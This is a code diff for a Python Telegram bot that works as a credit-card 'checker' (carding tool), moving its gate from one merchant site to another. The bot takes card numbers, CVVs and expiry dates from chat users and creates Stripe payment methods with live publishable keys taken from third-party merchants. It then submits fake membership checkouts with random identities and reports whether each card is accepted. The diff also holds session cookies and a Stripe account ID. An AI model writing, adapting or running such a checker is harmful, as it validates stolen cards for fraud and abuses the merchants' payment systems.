@@ -1,38 +1,39 @@
 import time
 from pyrogram import Client
 import requests
+
 import re
+# import bs4
 from values import *
 from pyrogram import Client, filters
 import json
 
 headers = {
-    "authority": "my.smashgo.co",
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
-    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-    "content-type": "application/x-www-form-urlencoded",
-    "cookie": "PHPSESSID=0417s6hhofc6cgd4g5tbi72bge",
-    "origin": "https://my.smashgo.co",
-    "referer": "https://my.smashgo.co/account/membership-checkout/?level=8",
-    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}
+    'authority':'www.voclr.it',
+    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/',
+    'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
+    'content-type':'application/x-www-form-urlencoded',
+    'cookie':'PHPSESSID=97976bceefac3464ffa1871df2a27c76',
+    'origin':'https://www.voclr.it',
+    'referer':'https://www.voclr.it/membership-account/membership-checkout/',
+    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'}
 
 
 
 
 
-
-
-@Client.on_message(filters.command(["ca"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
-async def ca(Client, message):
+@Client.on_message(filters.command(["ch","chk"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
+async def ch(Client, message):
     try:
         started_time = time.time()
         banned_bins = open('files/bannedbin.txt', 'r').readlines()
-        verified_gps = open('files/groups.txt', 'r').readlines()        
+        verified_gps = open('files/groups.txt', 'r').readlines()
         if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
+            print(verified_gps)
             await message.reply_text(text= group_not_allowed,reply_to_message_id=message.message_id)
         else:
             text = f"""
-<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
 <b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
 <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
@@ -108,33 +109,20 @@ async def ca(Client, message):
                                 res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                 random_data = json.loads(res.text)
                                 # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
-                                first_name = random_data['results'][0]['name']['first']
-                                last_name = random_data['results'][0]['name']['last']
+                                # first_name = random_data['results'][0]['name']['first']
+                                # last_name = random_data['results'][0]['name']['last']
                                 # street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
                                 # city = random_data['results'][0]['location']['city']
                                 # state = random_data['results'][0]['location']['state']
                                 # zip = random_data['results'][0]['location']['postcode']
                                 email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
                                 password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
-                                data = {
-'type':'card',
-'card[number]': cc,
-'card[cvc]': cvv,
-'card[exp_month]': mes,
-'card[exp_year]': ano,
-'guid':'f3abdff2-fbf9-422b-aed9-a41300a894819d9caf',
-'muid':'f2bc9140-eacc-48e2-812d-1f411d4fb4246b3558',
-'sid':'7ce1609d-f9bb-4179-8709-2b2ee683e501ef95db',
-'pasted_fields':'number',
-'payment_user_agent':'stripe.js/7338eae82; stripe-js-v3/7338eae82',
-'time_on_page':'40188',
-'key':'pk_live_51HGdXUCXgKhUdQ35qYXUKcjbluFQq0AIPhLy3P83tUjGeQ1zbC2wMKiPLVVfuJOvEc2r2hQl4CqDucjHhaQS6a0x00rP7pEwU0',
-                                }
+                                data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F583319551%3B+stripe-js-v3%2F583319551&time_on_page=69254&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_16WRSqINWTSGTB2G"
                                 res = curl.post("https://api.stripe.com/v1/payment_methods",headers=sk_headers,data=data)
                                 json_first = json.loads(res.text)
                                 if 'error' in json_first:
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -146,7 +134,7 @@ async def ca(Client, message):
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -159,7 +147,7 @@ async def ca(Client, message):
                                 else:
                                     id = json_first["id"]
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -168,10 +156,10 @@ async def ca(Client, message):
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
 <b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                     await msg.edit_text(text)
-                                    data = f"level=8&levelstodel=&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&first_name={first_name}&last_name={last_name}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear=ano"
-                                    res = curl.post("https://my.smashgo.co/account/membership-checkout/?level=8",headers=headers,data=data)
+                                    data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
+                                    res = curl.post("https://www.voclr.it/membership-account/membership-checkout/",headers=headers,data=data)
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -251,7 +239,7 @@ async def ca(Client, message):
                                             await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                         else:
                                             lasttext = f"""
-<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>〄</b> GATE: <b>STRIPE FREE [2]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
